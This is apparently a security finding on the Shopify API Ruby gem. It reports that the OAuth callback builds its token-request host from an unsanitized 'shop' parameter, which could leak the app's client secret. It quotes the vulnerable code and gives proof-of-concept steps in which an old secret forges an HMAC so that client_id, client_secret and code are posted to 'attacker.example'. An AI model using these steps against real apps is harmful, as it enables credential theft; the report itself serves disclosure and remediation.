## Confirmed pattern across the gem

Every other credential-carrying flow in this gem validates the `shop` string against `Utils::ShopValidator.sanitize!` (allow-listing `myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`) **before** it is used to build the host that receives `client_secret`:

- `ClientCredentials.client_credentials` — `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the `HttpClient` session. [1](#0-0) 
- `TokenExchange.migrate_to_expiring_token` — same pattern. [2](#0-1) 
- `TokenExchange.exchange_token` — derives `dest_shop` from a signed JWT `dest` claim (implicitly trusted, not raw user input). [3](#0-2) 

`Oauth.validate_auth_callback`, however, takes `auth_query.shop` straight from the OAuth callback query string and uses it, **unsanitized**, to build the session whose host receives the client secret: [4](#0-3) 

`Clients::HttpClient#initialize` builds the request host directly from `session.shop` with no domain allow-listing of its own: [5](#0-4) 

## Why the HMAC does not close the gap

`AuthQuery#to_signable_string` covers `code, host, shop, state, timestamp`, and `HmacValidator.validate` checks this against `Context.api_secret_key` (and optionally `old_api_secret_key`): [6](#0-5) [7](#0-6) 

This proves the `shop` value was signed by *someone holding the current or old secret* — it does **not** prove the value is shaped like a real Shopify domain. The equality the code relies on is:

`shop param covered by valid HMAC == "shop is a myshopify.com/myshopify.io host"`

This equality is false. A merchant/app-development flow with a rotated `old_api_secret_key`, or any scenario where an old/leaked secret is still accepted (the code explicitly supports validating against `old_api_secret_key`), lets a party who only holds that older secret produce a validly-HMAC'd callback with an attacker-chosen `shop` value such as `attacker.example` or `internal-metadata-service.local`. `ShopValidator.sanitize!` exists precisely to reject such values elsewhere in the same codebase, but `oauth.rb` never calls it.

## Impact

`validate_auth_callback` then does:
```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
body = { client_id: ..., client_secret: Context.api_secret_key, code: auth_query.code, ... }
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
client.request(... path: "access_token" ...)
``` [8](#0-7) 

Because `HttpClient` builds `@base_uri` as `"https://#{session.shop}"`, an unvalidated `shop` value drives the POST destination that carries the app's `client_secret` in the body — i.e. SSRF carrying the app's OAuth client secret to an attacker-influenced host, gated only on possessing an HMAC computed with the (possibly rotated/old) secret.

## Title
Unvalidated `shop` domain in `Oauth.validate_auth_callback` allows SSRF exfiltration of `client_secret` — (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token POST request's destination host directly from `auth_query.shop`, an attacker-supplied query parameter, without ever calling `Utils::ShopValidator.sanitize!` — the domain allow-list function that every other OAuth-adjacent flow (`ClientCredentials`, `TokenExchange.migrate_to_expiring_token`) in this same gem uses.

### Finding Description
`AuthQuery#to_signable_string` binds `shop` (and `code`, `host`, `state`, `timestamp`) into the HMAC, and `HmacValidator.validate` checks the request against `Context.api_secret_key` and, if present, `Context.old_api_secret_key`. This proves only that the `shop` string was signed with a currently-or-previously-valid secret — never that it is a legitimate Shopify-hosted domain. `validate_auth_callback` then feeds `auth_query.shop` straight into `Auth::Session.new(shop: auth_query.shop)` and passes that session to `Clients::HttpClient.new`, which derives its request host as `"https://#{api_host || session.shop}"` with no further domain check. The client secret is placed in the POST body of that request. [9](#0-8) [5](#0-4) 

### Impact Explanation
An attacker able to construct a request that satisfies the HMAC check with a non-`myshopify` `shop` value (e.g., during a secret-rotation window where `old_api_secret_key` is still valid, or if an old secret has otherwise become known through legitimate but no-longer-privileged means) can cause the gem to POST the app's `client_id`/`client_secret` and the OAuth `code` to an attacker-chosen host, exfiltrating the app's client secret — matching the High-impact "SSRF with the app's credentials" category.

### Likelihood Explanation
Requires a scenario where an HMAC computed with a still-accepted secret (current or old) exists for a forged `shop` value; the library's built-in support for `old_api_secret_key` widens this window during key rotation, and no other layer in this gem validates `shop` shape before the credential-bearing request is sent.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` in `Oauth.validate_auth_callback` before constructing `null_session`/`Auth::Session`, mirroring the pattern already used in `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`.

### Proof of Concept
1. During/after a secret rotation, an actor in possession of the previous `old_api_secret_key` computes `hmac = HMAC-SHA256(old_api_secret_key, "code=x&host=x&shop=attacker.example&state=x&timestamp=x")`.
2. Deliver a callback request with `shop=attacker.example` and this `hmac` to the app's OAuth callback route, along with a valid `state` cookie value.
3. `HmacValidator.validate` succeeds against `old_api_secret_key`. [10](#0-9) 
4. `validate_auth_callback` builds `Auth::Session.new(shop: "attacker.example")` and `Clients::HttpClient` POSTs `{client_id, client_secret, code}` to `https://attacker.example/admin/oauth/access_token`. [11](#0-10)

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```
